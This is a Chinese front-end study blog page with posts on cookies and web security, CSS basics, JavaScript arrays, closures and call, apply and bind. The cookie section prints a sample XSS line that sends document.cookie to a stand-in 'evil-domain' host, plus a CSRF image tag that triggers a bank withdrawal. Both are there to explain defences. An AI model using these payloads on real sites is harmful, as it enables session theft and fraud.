<h5 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h5><p>持久性 Cookie 可以指定一个特定的过期时间（Expirse）或有效期（Max-Age）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = xxx; Expirse = 时间点（Max-Age = 时长）&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="secure-标记"><a href="#secure-标记" class="headerlink" title="secure 标记"></a>secure 标记</h5><p>安全的 Cookie 只应通过 HTTPS 协议加密过的请求发送给服务端，设置 secure 标记的 Cookie 只在 HTTPS 中生效</p>
<h5 id="HttpOnly-标记"><a href="#HttpOnly-标记" class="headerlink" title="HttpOnly 标记"></a>HttpOnly 标记</h5><p>由于 Cookie 可以通过 JS 的 <code>document.cookie</code> 进行修改，但是通过 JS 的 <code>document.cookie</code> 无法访问带有 HttpOnly 标记的 Cookie，所以包含服务端 Session 信息的 Cookie 不想被浏览器的 JS 脚本调用，设置 HttpOnly 标记即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = a3fWa; Expires = GMT时间格式; Secure; HttpOnly&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="Cookie-作用域"><a href="#Cookie-作用域" class="headerlink" title="Cookie 作用域"></a>Cookie 作用域</h5><p><code>Domain</code> + <code>Path</code> 标识定义了 Cookie 的作用域，即 Cookie 应该发送给那些 URL</p>
<ul>
<li><p><code>Domain</code> ==&gt; 制定哪些主机可以接收 Cookie，如果不指定，不包含子域名，如果指定了 <code>Domain</code> 则一般包含子域名。例如，如果设置 <code>Domain = mozilla.org</code>，则 Cookie 也包含在子域名中（如 <code>developer.mozilla.org</code>）</p>
</li>
<li><p><code>Path</code> ==&gt; 制定了主机下哪些路径可以接收 Cookie（该 URL 路径必须存在于请求 URL 中）。例如，设置 <code>Path = /docs</code>，那么以下路径都会匹配 <code>/docs</code> | <code>/docs/web</code> | <code>/docs/web/http</code></p>
</li>
</ul>
<h5 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h5><p>SameSite Cookie 允许服务器指定在跨站请求时该 Cookie 是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）</p>
<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h5 id="会话挟持和-XSS"><a href="#会话挟持和-XSS" class="headerlink" title="会话挟持和 XSS"></a>会话挟持和 XSS</h5><p>在 web 应用中，Cookie 常用来标记用户或授权会话，因此如果 web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure></p>
<p><code>HttpOnly</code> 类型的 Cookie 由于阻止了 JS 对 Cookie 的操作而能在一定程度上缓解此类攻击</p>
<h5 id="CSRF（跨域请求伪造）"><a href="#CSRF（跨域请求伪造）" class="headerlink" title="CSRF（跨域请求伪造）"></a>CSRF（跨域请求伪造）</h5><p>如果在不安全的聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>当打开含有这张图片的 HTML 页面时，如果之前登录了银行账号并且 Cookie 仍然有效（还没有其他验证步骤），银行中的钱会被自动转走。</p>
<h6 id="阻止-CSRF"><a href="#阻止-CSRF" class="headerlink" title="阻止 CSRF"></a>阻止 CSRF</h6><ol>
<li>对用户输入进行过滤来阻止 XSS</li>
<li>任何敏感操作都需要确认</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期</li>
</ol>
<h3 id="Cookie-特点"><a href="#Cookie-特点" class="headerlink" title="Cookie 特点"></a>Cookie 特点</h3><ol>
<li>Cookie 储存用户信息</li>
<li>服务器通过 <code>Set-Cookie</code> 响应头设置 Cookie </li>
<li>浏览器得到 Cookie 后，每次请求相同域名都要带上 Cookie </li>
<li>服务器通过 Cookie 得知是哪个用户（<code>request.headers.cookie</code> // 读取 Cookie ）</li>
<li>Cookie 存储在本地的一个文件中</li>
<li>Cookie 不安全，用户可以通过开发者工具 Application/Cookie 可以进行修改，或者 JS 的 <code>document.cookie</code> 进行修改</li>
<li>每个浏览器的 Cookie 不同</li>
<li>Cookie 有时效性</li>
<li>后端可以强制设置 Cookie 有效期</li>
<li>Cookie 按域名划分。一个网站只会带着自己域名的 Cookie ，不会带着其他域的 Cookie </li>
</ol>
<h5 id="Cookie-说明"><a href="#Cookie-说明" class="headerlink" title="Cookie 说明"></a>Cookie 说明</h5><p>Cookie 大小受限，每次请求新的页面 Cookie 都会被发送过去。Cookie 不能跨域调用。Cookie 的作用是与服务器进行交互，Cookie 作为 HTTP 规范的一部分存在 </p>
<h5 id="删除-Cookie"><a href="#删除-Cookie" class="headerlink" title="删除 Cookie"></a>删除 Cookie</h5><ul>
<li>服务器端可以通过设置 Expires、max-age 两个标签将 Cookie 设置为过期状态</li>
<li>JavaScript 可以通过document.cookie API 删除 Cookie</li>
</ul>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ol>
<li><p><code>formdata</code> 是一段一段上传的，上传时会触发 <code>data</code> 事件（node http get post data）</p>
</li>
<li><p>前端是不安全的，所以前端可以不进行验证，但是后端必须进行验证。用户可以通过 <code>curl</code> 发送请求，这样就越过了前端 JS</p>
</li>
<li><p><code>decodeURIComponent()</code><br>用于解码由 <code>encodeURIComponent()</code> 方法或其他类似方法编码的部分 URI（统一资源标识符）</p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener"><code>Set-Cookie</code></a></p>
</li>
<li><p>CSRF（跨域请求伪造） 是指一种挟持受信任用户向服务器发送非预期请求的攻击方式。例如，这些非预期请求可能在 URL 后加入一些恶意的参数，从而达到攻击者的目的</p>
</li>
<li><p>XSS（Cross-site scripting）是一种安全漏洞，攻击者利用这种漏洞在网上注入恶意的客户端代码。当被攻击者登录网站时就会自动运行这些恶意代码，从而攻击者可以突破网站的访问权限，冒充受害者。</p>
<ul>
<li>如果 Web 应用程序没有部署足够的安全验证，那么这些脚本可以任意读取 Cookie或者其他敏感的网站信息，或者让恶意脚本重写 HTML 内容</li>
<li>以下两种情况最容易发生 XSS 攻击<ol>
<li>数据从一个不可靠的链接进入一个 Web 应用程序</li>
<li>没有过滤掉恶意代码的动态内容被发送给 Web 用户</li>
</ol>
</li>
<li>XSS 攻击类型<ol>
<li><strong>存储型（持久型）</strong>：注入型脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器上传回并执行</li>
<li><strong>反射型（非持久型）</strong>：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站，Web 服务器将注入脚本，比如一个错误信息、搜索结果等返回到用户浏览器上，浏览器会执行这个脚本，因为，浏览器认为这个响应来自可信任的服务器</li>
<li>基于 DOM 的 XSS：被执行的恶意脚本会修改页面脚本结构</li>
</ol>
</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/HTTP/">HTTP</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:54:05.000Z"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">总结篇（二） -- 基础知识之 CSS</a></h1>
  

    </header>
    <div class="entry">
      
        <ol>
<li><p>选择器</p>
<ul>
<li>标签选择器</li>
<li>类选择器</li>
<li>ID 选择器</li>
<li>后代选择器</li>
<li>子选择器</li>
<li>通用选择器</li>
<li>伪类选择符</li>
<li>分组选择符</li>
</ul>
</li>
<li><p>文档流<br> 内联元素 ==&gt; 从左向右依次流动<br> 块级元素 ==&gt; 从上到下依次流动，每个块级元素独占一行</p>
</li>
<li>盒模型<br> box-sizing: content-box; ==&gt; 标准盒模型，width = contentWidth<br> box-sizing: border-box; ==&gt; width = contentWidth + padding + border</li>
<li>伪类<br> 伪类有动态伪类、结构伪类、否定伪类等等<ul>
<li>动态伪类：<br><code>:link</code> ==&gt; 未访问前的样式效果<br><code>:hover</code> ==&gt; 鼠标悬停时的样式效果<br><code>:active</code> ==&gt; 鼠标点击时的样式效果<br><code>:visited</code> ==&gt; 访问后的样式效果<br><code>:focus</code> ==&gt; 元素成为焦点时的样式效果</li>
<li>结构伪类<br><code>:first-child</code> ==&gt; 第一个子元素<br><code>:last-child</code> ==&gt; 最后一个子元素<br><code>:nth-child(n)</code> ==&gt; 第 n 个子元素</li>
<li>否定伪类<br><code>:not</code> ==&gt; 不符合参数选择器 X 描述的元素</li>
</ul>
</li>
<li>伪元素<ul>
<li><code>::before</code> ==&gt; 创建伪元素，此伪元素是元素的第一个子元素</li>
<li><code>::after</code> ==&gt; 创建伪元素，此伪元素是元素的最后一个子元素</li>
</ul>
</li>
<li><p>堆叠上下文（BFC）<br> BFC 就是块级格式化上下文。形成 BFC 条件：</p>
<ul>
<li>浮动</li>
<li>绝对定位元素（<code>position: absolute;</code>）</li>
<li>非块盒的块容器（<code>display: inline-block; | display: table-cells</code>）</li>
<li>overflow 不为 visible 的块盒</li>
<li><p><code>display: flow-root</code></p>
<p>功能：</p>
</li>
</ul>
<ol>
<li>将内部浮动元素包裹起来</li>
<li>两个相邻的 BFC 之间划清界限</li>
</ol>
</li>
<li><p>媒体查询<br> <code>&lt;link&gt;</code> 标签中的媒体查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; metia=&quot;(max-width: 800px)&quot; href=&quot;xxx.css&quot;&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">样式表中的 CSS 媒体查询</span><br></pre></td></tr></table></figure>
<p> <style></p>
<pre><code>@media (max-width: 800px) and (min-width: 600px) {
    // 选择器 + 样式
}
</code></pre><p> </style></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8. 动态 REM</span><br><span class="line">    rem 是相对单位长度，它是根元素 ` &lt;html&gt; ` 的 ` font-size ` 的大小，网页默认的 ` font-size: 16px `，运用 JS 探取屏幕宽度，之后定义根元素的 ` </span><br><span class="line">font-size ` 与屏幕宽度相关，之后一切单位都以屏幕宽度为基准</span><br></pre></td></tr></table></figure>
<p> <script></p>
<pre><code>let pageWidth = window.innerWidth
document.write( &apos;&lt;style&gt;html{ font-size:&apos; + pageWidth/10 + &apos;px;}&lt;/style&gt;&apos; )
</code></pre><p> </script><br> ```</p>
</li>
<li>box-shadow<ul>
<li>垂直偏移</li>
<li>水平偏移</li>
<li>模糊半径</li>
<li>模糊尺寸</li>
<li>颜色</li>
</ul>
</li>
<li>transform<ul>
<li><code>translate</code> ==&gt; 移动</li>
<li><code>rotate</code> ==&gt; 旋转</li>
<li><code>skew</code> ==&gt; 倾斜</li>
<li><code>scale</code> ==&gt; 缩放</li>
</ul>
</li>
<li>帧动画<ul>
<li><code>animation-name</code> ==&gt; 动画名称</li>
<li><code>animation-duration</code> ==&gt; 持续时间</li>
<li><code>animation-delay</code> ==&gt; 延迟</li>
<li><code>animation-timing-function</code> ==&gt; 动画类型</li>
<li><code>@keyframe</code> ==&gt; 关键帧</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/总结/">总结</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:34:07.000Z"><a href="/2018/02/05/JS系列 -- Array 浅析/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/JS系列 -- Array 浅析/">JS系列 -- Array 浅析</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数组是按次序排列的一组值的集合，它是一个<strong>对象</strong>。<br>数组可以存储任何类型的数据（数字，字符串，布尔值或者对象）</p>
<h3 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h3><h5 id="使用-Array-构造函数"><a href="#使用-Array-构造函数" class="headerlink" title="使用 Array 构造函数"></a>使用 Array 构造函数</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-6ea1c407cf635857.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 构造函数"></p>
<h5 id="使用数组字面量表示法"><a href="#使用数组字面量表示法" class="headerlink" title="使用数组字面量表示法"></a>使用数组字面量表示法</h5><p>数组字面量由一对包含数组项的方括号表示，多个数组之间以逗号隔开。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-335e259acf5fba52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 字面量"></p>
<h1 id="属性-length"><a href="#属性-length" class="headerlink" title="属性 length"></a>属性 length</h1><p>表示数组的长度，即数组中元素的个数。<br>数组索引从 0 开始，索引上下限为 0 到 length-1 。<br>数组的 length 属性<strong>不是只读</strong>的，可以进行设置<br><img src="http://upload-images.jianshu.io/upload_images/9617841-def1e376a8012efe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length 修改"></p>
<p><strong>注意：</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-7e72fd6106cc9701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length"><br><code>arr02</code> 中 <code>arr02[ 1 ] === undefined</code>，这个元素是存在的，只不过值为 undefined。</p>
<h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>Array 是对象，所以 Array 有对象的一些方法<br><img src="http://upload-images.jianshu.io/upload_images/9617841-b4189f737381258e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型"><br>可以为数组添加属性，因为数组是对象。</p>
<h1 id="检测数组"><a href="#检测数组" class="headerlink" title="检测数组"></a>检测数组</h1><ul>
<li><code>Array.isArray()</code> ==&gt; 用于确定传递的值是否是一个 Array</li>
<li><code>value instanceof Array</code> ==&gt; 使用 instanceof 操作符检测数组</li>
<li><code>value.push()</code> ==&gt; 使用数组的特有方法，从而检测数组</li>
</ul>
<h1 id="方法-API"><a href="#方法-API" class="headerlink" title="方法 API"></a>方法 API</h1><h3 id="Object-原型上的-API"><a href="#Object-原型上的-API" class="headerlink" title="Object 原型上的 API"></a>Object 原型上的 API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-94e2302778e6f341.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object 原型上的 API"></p>
<h3 id="Array-prototype-API"><a href="#Array-prototype-API" class="headerlink" title="Array.prototype API"></a>Array.prototype API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-ebda095a9826c3f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型上的 API"></p>
<h4 id="栈方法"><a href="#栈方法" class="headerlink" title="栈方法"></a>栈方法</h4><p>栈是一种可以限制插入和删除项的数据结构。它是一种 LIFO（Last-In-First -Out，后进先出）的数据结构，栈中项的插入（推入）和移除（弹出）只发生在一个位置 —- 栈的顶部。</p>
<ul>
<li><code>push()</code> ==&gt; 将一个或多个元素添加到数组的末尾，并<strong>返回新数组的长度</strong>。</li>
<li><code>pop()</code> ==&gt; 从数组中删除最后一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
</ul>
<h4 id="队列方法"><a href="#队列方法" class="headerlink" title="队列方法"></a>队列方法</h4><p>队列数据结构的访问规则是 FIFO（Fitst-In-Fitst-Out，先进先出），队列在列表的末端添加项，在列表前端移除项。</p>
<ul>
<li><code>shift()</code> ==&gt; 从数组中删除第一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
<li><code>unshift()</code> ==&gt; 将一个或多个元素添加到数组的开头，并<strong>返回新数组的长度</strong>。</li>
</ul>
<h4 id="重排序方法"><a href="#重排序方法" class="headerlink" title="重排序方法"></a>重排序方法</h4><p>重排序方法 <code>sort()</code> 和<code>reverse()</code> 的<strong>返回值是经过排序之后的数组</strong>，这两种方法都会<strong>改变原数组</strong>。</p>
<ul>
<li><p><code>sort()</code> ==&gt; 在适当的位置对数组的元素进行排序，并<strong>返回数组</strong>。默认排序顺序是根据<strong>字符串Unicode码点</strong>。<br> <img src="http://upload-images.jianshu.io/upload_images/9617841-4bd79d3863269eaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"><br> <img src="http://upload-images.jianshu.io/upload_images/9617841-b07b786adcc4b08e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"></p>
</li>
<li><p><code>reverse()</code> ==&gt; 将数组中元素的位置颠倒，并<strong>返回该数组的引用</strong>。第一个数组元素成为最后一个数组元素，最后一个数组元素成为第一个。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-03c659fb37fe7170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array reverse"></p>
</li>
</ul>
<h4 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h4><ul>
<li><p><code>concat()</code> ==&gt; 用于合并两个或多个数组。此方法不会更改现有数组，而是<strong>返回一个新数组</strong>。</p>
</li>
<li><p><code>slice()</code> ==&gt; <strong>返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象</strong>，原数组不会被修改。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-f46d0e64ba879c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array slice()"></p>
</li>
<li><p><code>splice()</code> ==&gt; 通过删除现有元素和/或添加新元素来更改一个数组的内容。<br><strong>返回由被删除的元素组成的一个数组</strong>。<br><strong>删除了一个元素</strong> ==&gt; <strong>返回只包含一个元素的数组</strong>。<br><strong>没有删除元素</strong> ==&gt; <strong>返回空数组</strong>。<br><strong>参数：</strong> <code>array.splice(start [ , deleteCount [, item1 [, item2, ... ] ] ])</code><br><img src="http://upload-images.jianshu.io/upload_images/9617841-5d25a212665cf00a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array splice API"></p>
</li>
</ul>
<h4 id="位置方法"><a href="#位置方法" class="headerlink" title="位置方法"></a>位置方法</h4><ul>
<li><code>indexOf()</code> ==&gt; <strong>返回在数组中可以找到一个给定元素的第一个索引</strong>，如果不存在，则<strong>返回-1</strong></li>
<li><code>LastIndexOf()</code> ==&gt; <strong>返回指定元素在数组中的最后一个的索引</strong>，如果不存在则<strong>返回 -1</strong>。从数组的后面向前查找</li>
</ul>
<h4 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h4><ul>
<li><p><code>forEach()</code> ==&gt; 对数组的每个元素执行一次提供的函数。<strong>返回 undefined</strong><br>参数：<strong>回调函数</strong>和可选的执行回调函数时用作this的值，<strong>回调函数</strong>接受三个值：</p>
<ol>
<li>数组中正在处理的当前元素</li>
<li>数组中正在处理的当前元素的索引</li>
<li>forEach()方法正在操作的数组<br><img src="http://upload-images.jianshu.io/upload_images/9617841-2ecfa4be91a212d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array forEach"></li>
</ol>
</li>
<li><p><code>map()</code> ==&gt; 创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。<strong>返回一个新数组，每个元素都是回调函数的结果</strong><br><strong>和 <code>forEach</code> 作用一样，只是返回一个新数组</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-596d0557d2e52a1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array map"></p>
</li>
<li><p><code>every()</code> ==&gt; 测试数组的所有元素是否都通过了指定函数的测试。<strong>返回布尔值</strong></p>
</li>
<li><p><code>some()</code> ==&gt; 测试数组中的某些元素是否通过由提供的函数实现的测试。<strong>返回布尔值</strong></p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-f3f669c4e73662af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array every + some"></p>
<ul>
<li><code>filter()</code> ==&gt; 创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。 <strong>返回一个新的通过测试的元素的集合的数组</strong></li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-36de13831ddd2bf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array filter"></p>
<h4 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h4><ul>
<li><code>reduce()</code> ==&gt; 对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
<li><code>reduceRight()</code> ==&gt; 接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-01-31T10:46:51.000Z"><a href="/2018/01/31/总结篇（一）-- 基础知识/">2018-01-31</a></time>
      
      
  
    <h1 class="title"><a href="/2018/01/31/总结篇（一）-- 基础知识/">总结篇（一） -- 基础知识</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="移动端适配"><a href="#移动端适配" class="headerlink" title="移动端适配"></a>移动端适配</h2><ol>
<li><p>使用 <code>&lt;meta&gt;</code> 标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&apos;viewport&apos; content=&apos; width=device-width user-scalable=no initial-scale=1.0 maximun-scale=1.0 minimum=1.0 &apos; &gt;</span><br></pre></td></tr></table></figure>
<p>这个标签主要作用是网页宽度默认等于屏幕宽度，用户不可以缩放，缩放比例1。</p>
</li>
<li><p>使用 Media Query（媒体查询） 模块<br>通过媒体查询，从而判断采用的样式<br>主要是有两种方式：</p>
<ul>
<li><p><link> 元素中的媒体查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;stylesheet&apos; href=&apos;./css/style.css&apos; media=&apos;(min-width: 800px) and (max-width: 1400px)&apos; &gt;</span><br></pre></td></tr></table></figure>
<p>这个标签表示只有 width 在 800px-1400px 时才采用 style.css 这个样式表</p>
</li>
<li><p>样式表中的媒体查询<br>在样式表中书写媒体查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@media (max-width: 414px)&#123;</span><br><span class="line">    .button&#123;</span><br><span class="line">        display: block;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码表示：当宽度小于 414px 的时候，button 元素显示在页面中</p>
</li>
</ul>
</li>
<li><p>动态rem<br>一切以宽度为基准。<br>rem是根元素（html）的 <code>font-size</code> 的值，我们可以使用 JS 实现将 html 的 <code>font-size</code> 设置为屏幕宽度，之后 rem 就和屏幕宽度有一定的映射，当然也可以设置为屏幕宽度的 1/2 ，之后使用 rem 实现元素的宽高 margin padding 等需求。</p>
</li>
<li><p>在做移动端适配的时候还要注意一些小问题</p>
<ul>
<li>移动端没有 hover 事件，但是有 touch 事件</li>
<li>移动端没有 resize 事件，没有滚动条</li>
<li>rem 单位可以和其他单位混用，例如：<code>border: 1px solid red</code></li>
</ul>
</li>
</ol>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><ol>
<li><p>闭包指一个函数或函数的引用与一个引用环境绑定在一起，这个引用环境是一个存储该函数每个自由变量的表。简单的说就是自由变量和引用这个自由变量的函数就是闭包。闭包可以读取其上作用域链中的值。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a = 1</span><br><span class="line">function fn()&#123;</span><br><span class="line">    console.log(a)</span><br><span class="line">&#125;</span><br><span class="line">fn.call(undefined)   // 调用之后，会打印出1</span><br></pre></td></tr></table></figure>
<p> 上述的变量 a 和函数 fn 即是闭包</p>
</li>
<li><p>当我们在写代码的时候，会在无形之中就使用到了闭包。</p>
</li>
</ol>
<ul>
<li><p>用途一：读取其上作用域链中的值。例如在全局作用域中定义了 a 和函数 fn，在 fn 中并没有定义 a ，但是却可以使用全局变量 a。参照上面例子。</p>
</li>
<li><p>用途二：让自由变量保存在内存中，即封装变量<br>在全局代码执行的时候，会产生一个全局执行上下文环境（Execution Context）。调用函数的时候，会产生一个函数执行上下文环境（Execution Context）。当函数调用结束后，函数执行上下文环境和其中的数据将被消除，重新回到全局执行上下文环境。但是当在函数执行上下文的环境中存在闭包，那么即使这个函数调用完成，其执行上下文环境也不会被消除，因为还有闭包被引用着。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function fn1()&#123;</span><br><span class="line">   var a = 1</span><br><span class="line">   addA = function()&#123;  // 此处不用 var 声明，从而创建一个全局变量，但是其可以引用局部变量 a </span><br><span class="line">       a++</span><br><span class="line">   &#125;</span><br><span class="line">   function fn2()&#123;</span><br><span class="line">       console.log(a)</span><br><span class="line">   &#125;</span><br><span class="line">   return fn2</span><br><span class="line">&#125;</span><br><span class="line">result = fn1.call(undefined)</span><br><span class="line">result()  // 打印出 1</span><br><span class="line">addA()</span><br><span class="line">result()  // 打印出 1</span><br></pre></td></tr></table></figure>
<p>  当调用完 fn1 之后，局部变量 a 并不能被垃圾回收，因为 fn1 返回的函数仍然调用局部变量 a ，此时的局部变量 a 就被保存在内存中</p>
<p>  在函数内部定义局部变量，外部不能访问，但是闭包仍能访问到这个局部变量，外部如果要访问局部变量，只能通过函数 return 出来的接口。</p>
</li>
</ul>
<h2 id="call、apply、bind"><a href="#call、apply、bind" class="headerlink" title="call、apply、bind"></a>call、apply、bind</h2><p>这三个方法都挂载在 Function.prototype 上，都是函数的方法，可以调用函数</p>
<h4 id="call"><a href="#call" class="headerlink" title="call()"></a>call()</h4><ul>
<li><p>作用：<br>  切换上下文（this）<br>  操作参数</p>
</li>
<li><p>当使用 call() 调用一个函数的时候，call() 的第一个参数是 this ，第二个参数是需要传递给函数的实参（arguments）。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn.call( this , arguments )</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="apply"><a href="#apply" class="headerlink" title="apply()"></a>apply()</h4><ul>
<li><p>作用：</p>
<p>  切换上下文（this）<br>  操作参数</p>
</li>
<li><p>当使用 apply() 调用一个函数的时候，apply() 的第一个参数是 this，第二个参数是一个数组，apply() 方法会将数组中的元素拆分依次传入到函数中。</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn.apply( this , [ 1,2,3 ] )</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h4><ul>
<li><p>作用：</p>
<p>  切换上下文（this）<br>  科里化，即部分求值，函数调用是可以传递参数，之后返回的函数（闭包）也可以接收参数</p>
</li>
<li><p>当使用 bind() 调用一个函数的时候，bind() 方法会返回一个函数，他的第一个参数是 this ，第二个参数是需要传递给函数的实参</p>
